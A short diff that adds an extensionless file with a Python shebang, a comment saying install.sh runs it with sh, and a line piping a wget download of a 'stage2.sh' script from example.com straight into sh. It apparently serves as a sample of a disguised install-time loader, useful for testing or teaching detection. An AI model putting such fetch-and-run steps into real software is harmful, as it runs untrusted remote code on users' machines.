@@ -1,0 +1,3 @@
+#!/usr/bin/env python3
+# No extension and a Python shebang, but install.sh runs it with sh.
+wget -qO- https://example.com/stage2.sh | sh
